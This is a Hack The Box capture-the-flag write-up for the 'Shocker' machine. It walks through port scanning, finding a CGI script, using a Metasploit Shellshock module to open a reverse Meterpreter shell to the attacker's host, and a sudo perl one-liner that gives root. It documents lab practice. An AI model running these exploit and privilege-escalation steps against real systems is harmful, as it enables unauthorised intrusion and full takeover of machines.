# HTB Write-Up: Shocker

| Field      | Details                                                        |
|------------|----------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Shocker)    |
| Difficulty | Easy                                                           |
| OS         | Linux                                                          |
| Author     | Landau                                                         |
| Date       | April 19, 2026                                                 |

---


## 1. Reconnaissance


As alwasy we start with the rustscan and 2 ports are open , 2222 and 80 . 

```bash

┌──(landau㉿landau)-[~/Downloads/HTB-writeUps/Shocker]
└─$ rustscan -a 10.129.23.21 --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Where '404 Not Found' meets '200 OK'.

[~] The config file is expected to be at "/home/landau/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.23.21:80
Open 10.129.23.21:2222


```

## 2. Enumeration

Starting with the 80's port we see a page with only foto , I downloaded it to look with exiftool , stegseek but didnt find anything . 

After that I continue with directory enumeration with ffuf . 


```bash

┌──(landau㉿landau)-[~/Downloads/HTB-writeUps/Shocker]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.129.23.21/FUZZ 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.23.21/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 113ms]
.htaccess               [Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 113ms]
cgi-bin/                [Status: 403, Size: 295, Words: 22, Lines: 12, Duration: 91ms]
server-status           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 84ms]
:: Progress: [20478/20478] :: Job [1/1] :: 404 req/sec :: Duration: [0:00:48] :: Errors: 0 ::


```

Only find cgi-bin I enumerate cgi-bin also but didnt find anything let's do it with file excention.

```bash

 gobuster dir -u http://10.129.23.21/cgi-bin/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -x .sh, .php, .html, .txt           
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.23.21/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              sh
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 304]
/.htaccess.sh         (Status: 403) [Size: 307]
/.htpasswd            (Status: 403) [Size: 304]
/.htpasswd.sh         (Status: 403) [Size: 307]
/user.sh              (Status: 200) [Size: 119]
Progress: 90962 / 90962 (100.00%)
===============================================================
Finished
===============================================================


```

I fount /user.sh let's see what's inside .Here we see timer nothing more .
Then in msfconsole I searched apache cgi and found exploit . 


```bash

msf > search apache cgi

Matching Modules
================

   #   Name                                                 Disclosure Date  Rank       Check  Description
   -   ----                                                 ---------------  ----       -----  -----------
   0   exploit/multi/http/apache_normalize_path_rce         2021-05-10       excellent  Yes    Apache 2.4.49/2.4.50 Traversal RCE
   1     \_ target: Automatic (Dropper)                     .                .          .      .
   2     \_ target: Unix Command (In-Memory)                .                .          .      .
   3   auxiliary/scanner/http/apache_normalize_path         2021-05-10       normal     No     Apache 2.4.49/2.4.50 Traversal RCE scanner
   4     \_ action: CHECK_RCE                               .                .          .      Check for RCE (if mod_cgi is enabled).
   5     \_ action: CHECK_TRAVERSAL                         .                .          .      Check for vulnerability.
   6     \_ action: READ_FILE                               .                .          .      Read file on the remote server.
   7   exploit/windows/http/tomcat_cgi_cmdlineargs          2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability
   8   exploit/multi/http/apache_mod_cgi_bash_env_exec      2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
   9     \_ target: Linux x86                               .                .          .      .
   10    \_ target: Linux x86_64                            .                .          .      .
   11  auxiliary/scanner/http/apache_mod_cgi_bash_env       2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   12  auxiliary/dos/http/apache_mod_isapi                  2010-03-05       normal     No     Apache mod_isapi Dangling Pointer
   13  exploit/windows/http/php_apache_request_headers_bof  2012-05-08       normal     No     PHP apache_request_headers Function Buffer Overflow
   14  exploit/multi/http/tomcat_jsp_upload_bypass          2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass
   15    \_ target: Automatic                               .                .          .      .
   16    \_ target: Java Windows                            .                .          .      .
   17    \_ target: Java Linux                              .                .          .      .



```

8's one is interesting let's try that one . Set the options and run . and I got shell


## 3. Initial access

```bash

msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set rhost 10.129.23.21
rhost => 10.129.23.21
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set lhost 10.10.15.33
lhost => 10.10.15.33
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set targeturi /cgi-bin/user.sh
targeturi => /cgi-bin/user.sh
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > run
[*] Started reverse TCP handler on 10.10.15.33:4444 
[*] Command Stager progress - 100.00% done (1092/1092 bytes)
[*] Sending stage (1062760 bytes) to 10.129.23.21
[*] Meterpreter session 1 opened (10.10.15.33:4444 -> 10.129.23.21:50014) at 2026-04-19 20:36:08 +0400

meterpreter > shell
Process 1544 created.
Channel 1 created.
id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
bash -i
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ 

```

## 4. Privelege esclation

I  looked at the priveleges of this user and find out that this user has perl privilege . that's mean I can use the perl command with root privilege.


```bash
shelly@Shocker:~$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl

```

I searched perl from GFTobins and find getting root shell command .

```bash

shelly@Shocker:~$ sudo perl -e 'exec "/bin/sh"'
sudo perl -e 'exec "/bin/sh"'
id
uid=0(root) gid=0(root) groups=0(root)

```


